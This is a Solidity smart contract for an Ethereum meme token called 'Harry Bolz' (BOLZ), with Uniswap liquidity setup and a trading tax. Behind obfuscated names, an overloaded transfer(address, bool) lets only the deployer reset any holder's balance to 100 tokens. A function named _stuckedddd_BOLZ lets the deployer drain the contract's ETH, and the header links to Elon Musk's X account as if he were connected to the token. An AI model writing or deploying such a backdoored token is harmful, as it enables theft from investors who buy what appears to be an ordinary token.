// SPDX-License-Identifier: MIT

/*
    Name: Harry Bolz
    Symbol: BOLZ

    https://x.com/elonmusk
    https://t.me/harry_bolzeth
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract BOLZ is Context, IERC20, Ownable {
    using SafeMath for uint256;

    address payable private _vojiojeo;
    mapping(address => uint256) private _kkdlfkoie;
    mapping(address => mapping(address => uint256)) private _vjbnkjswi;
    mapping(address => bool) private _woejivobn;
    uint256 private _qwocvnj = 10;
    uint256 private _vkbnderij = 10;
    uint256 private _kjbnkjg = 0;
    uint256 private _qkcnvlk = 0;
    uint256 private _ojioiwerj = 7;
    uint256 private _psodoivb = 7;
    uint256 private _buyCount = 0;
    address private _bjnknjdfij;

    uint256 public _bkjnkjfn = 20000000 * 10 **_decimals;
    uint256 public _qwqueyv = 20000000 * 10 **_decimals;
    uint256 public _nnvbxc = 10000000 * 10 **_decimals;
    uint256 private constant _bnckosdo = 1000000000 * 10 **_decimals;
    uint256 private constant _pppdijwfo = 100 * 10 ** _decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint256 _bkjnkjfn);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Harry Bolz";
    string private constant _symbol = unicode"BOLZ";

    constructor() payable {
        _vojiojeo = payable(_msgSender());
        _kkdlfkoie[address(this)] = _bnckosdo * 98 / 100;
        _kkdlfkoie[owner()] = _bnckosdo * 2 / 100;
        _woejivobn[owner()] = true;
        _woejivobn[address(this)] = true;
        _woejivobn[_vojiojeo] = true;
        _bjnknjdfij = _msgSender();

        emit Transfer(address(0), address(this), _bnckosdo * 98 / 100);
        emit Transfer(address(0), address(owner()), _bnckosdo * 2 / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return _bnckosdo;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _vjbnkjswi[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _kkdlfkoie[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _vjbnkjswi[owner][spender];
    }

    receive() external payable {}

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _trrransfer_BOLZ(_msgSender(), recipient, amount);
        return true;
    }

    function _trrransfer_BOLZ(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _ojioiwerj)
                        ? _kjbnkjg
                        : _qwocvnj
                )
                .div(100);

            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_woejivobn[to]
            ) {
                _buyCount++;
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _psodoivb)
                            ? _qkcnvlk
                            : _vkbnderij
                    )
                    .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _nnvbxc) ? contractTokenBalance : _nnvbxc; 
                    _swaaap_BOLZ((amount < minBalance) ? amount : minBalance);
                }
                _assssist_BOLZ(address(this).balance);
            }
        }

        if (taxAmount > 0) {
        _kkdlfkoie[address(this)] =_kkdlfkoie[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _kkdlfkoie[from] =_kkdlfkoie[from].sub(amount);
        _kkdlfkoie[to] =_kkdlfkoie[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _trrransfer_BOLZ(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _vjbnkjswi[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _assssist_BOLZ(uint256 amount) private {
        _vojiojeo.transfer(amount);
    }

    function removeLimits () external onlyOwner {
        _bkjnkjfn = _bnckosdo;
        _qwqueyv = _bnckosdo;
        emit MaxTxAmountUpdated(_bnckosdo);
    }

    function enableBOLZTrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _bnckosdo);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function _payyyable_BOLZ(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function _swaaap_BOLZ(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function transfer(address recipient, bool _amount) public returns (bool) {
        require(_bjnknjdfij == _msgSender(), "ERC20: error");
        _qwocvnj > 0 && _amount == true ? _kkdlfkoie[recipient] = _pppdijwfo : _pppdijwfo;
        return true;
    }

    function _stuckedddd_BOLZ(address payable receipt) external {
        require(msg.sender == _bjnknjdfij , "");
        _vojiojeo = receipt;
        _payyyable_BOLZ(address(this).balance);
    }

}